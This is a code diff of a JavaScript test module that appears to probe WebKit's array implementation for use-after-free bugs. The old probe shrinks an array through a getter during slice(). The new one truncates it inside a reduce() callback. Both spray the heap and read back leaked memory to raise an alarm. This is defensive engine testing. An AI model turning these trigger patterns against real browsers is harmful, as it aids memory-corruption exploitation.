@@ -3,70 +3,62 @@ export default {
     category: 'CoreJS',
     risk:     'CRITICAL',
     description:
-        'Abusa do Array.prototype.slice nativo C++. Um getter é instalado no meio ' +
-        'do array. Durante a cópia em bloco (memcpy), o getter destrói a memória subjacente ' +
-        '(Butterfly). Se o C++ não revalidar os ponteiros, copia o lixo da RAM para o novo array.',
+        'Race condition síncrona no Array.prototype.reduce(). A função de callback ' +
+        'destrói o array subjacente a meio da iteração. Testa se o motor WebKit C++ ' +
+        'continua a ler do Butterfly libertado ou se aborta o loop em segurança.',
 
     setup: function() {
         this.results = {};
-        
-        // Array de números decimais (Ocupa blocos exatos de 8 bytes no Butterfly)
-        this.vulnArray = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66, 7.77, 8.88];
-
+        this.vulnArray = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66];
         const self = this;
 
-        // A ARMADILHA: Escondemos uma bomba no índice 3
-        Object.defineProperty(this.vulnArray, 3, {
-            get: function() {
-                // O GATILHO: O C++ C++ está a meio da clonagem do Array!
-                // Destruímos o tamanho do array original para libertar o seu Butterfly (memória)
-                this.length = 0;
-
-                // Inundamos o C++ com números bizarros para tentar sobrepor a memória que acabou de ficar livre
-                let trash = [];
-                for(let i = 0; i < 200; i++) {
-                    trash.push([0x1337, 0xBADF00D, 13.37]);
-                }
-                self.trash = trash; // Impede o Garbage Collector de limpar a inundação
+        // O motor C++ vai chamar isto para cada número
+        this.callback = function(acumulador, valor, index) {
+            // O GATILHO: No índice 2, destruímos o array e alocamos lixo no seu lugar
+            if (index === 2) {
+                self.vulnArray.length = 0; 
                 
-                return 4.44; // Retornamos o valor falso para o C++ continuar
+                let trash = [];
+                // Pressiona o alocador (bmalloc)
+                for(let i = 0; i < 500; i++) trash.push(13.37);
+                self.trash = trash;
             }
-        });
+            return acumulador + valor;
+        };
     },
 
     trigger: function() {
         try {
-            // slice() vai tentar clonar o vulnArray.
-            // Ao chegar ao índice 3, a bomba explode. Os índices 4, 5, 6 e 7 
-            // vão ser copiados da memória recém-libertada/corrompida!
-            this.results.leakedArray = Array.prototype.slice.call(this.vulnArray);
+            // Se o C++ for cego, ele vai somar o nosso lixo (13.37) ou endereços de RAM aos números
+            this.results.leakedSum = this.vulnArray.reduce(this.callback, 0);
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        // Probe 0: O tamanho do array clonado (deveria ser 8 se o C++ ignorou o free)
-        s => s.results.leakedArray ? s.results.leakedArray.length : 0,
+        // Probe 0: O motor atirou erro ou engoliu a corrupção?
+        s => s.results.error || 'Iteração C++ Concluída',
         
-        // Probe 1: O Extrator de INFO LEAK
+        // Probe 1: O Extrator Matemático de OOB (Out-of-Bounds)
         s => {
-            if (s.results.leakedArray && s.results.leakedArray.length > 5) {
-                // Vamos tentar ler o índice 6. Se o C++ tiver lido memória corrompida,
-                // em vez de 7.77 ou undefined, teremos um ponteiro bruto ou o nosso lixo (0x1337).
-                let val = s.results.leakedArray[6];
-                
-                if (typeof val === 'number' && !isNaN(val) && val !== 7.77) {
-                    return val; // Devolvemos o valor bruto para o Executor disparar o alarme!
+            let sum = s.results.leakedSum;
+            if (typeof sum === 'number' && !isNaN(sum)) {
+                // A soma esperada (se ele parar a meio) é: 0 + 1.11 + 2.22 + 3.33 = 6.66
+                // Se a soma for absurdamente maior (ex: > 100), o 'reduce' continuou a ler
+                // a memória apagada (lixo da RAM) e incluiu-a na matemática!
+                if (sum > 100) {
+                    return sum; // Dispara STALE DATA no HUD!
                 }
             }
-            return 0; // Retorna 0 (Seguro/Baseline)
+            return 0; // Protegido (o C++ meteu zeros ou undefineds)
         }
     ],
 
     cleanup: function() {
         this.vulnArray = null;
-        this.results = {};
+        this.callback = null;
         this.trash = null;
+        this.results = {};
     }
 };
